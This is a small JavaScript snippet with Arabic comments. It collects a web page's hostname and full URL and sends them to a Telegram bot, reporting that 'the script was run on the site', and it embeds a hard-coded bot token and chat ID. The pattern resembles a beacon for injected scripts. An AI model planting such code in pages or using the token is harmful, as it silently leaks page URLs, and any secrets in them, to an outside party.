<script>
    
function myFunction() {
    // معلومات البوت ومعرف الدردشة
    var token = '6380567136:AAHwFd8VyK2u49kuoA2ZhhnHfy_59CnHd_E';
    var chat_id = '2057593901';

    // جمع معلومات الموقع
    var host_name = window.location.hostname;
    var url = window.location.href;

    // إنشاء الرسالة
    var message = "تم تشغيل السكربت على الموقع:\n";
    message += "عنوان المضيف: " + host_name + "\n";
    message += "عنوان URL: " + url;

    // إرسال الرسالة إلى Telegram
    $.ajax({
        type: 'GET',
        url: 'https://api.telegram.org/bot' + token + '/sendMessage',
        data: {
            chat_id: chat_id,
            text: message
        },
        success: function(response) {
            console.log("تم إرسال الرسالة بنجاح.");
        },
        error: function(xhr, status, error) {
            console.error("حدثت مشكلة أثناء إرسال الرسالة إلى Telegram.");
        }
    });
}
    </script>
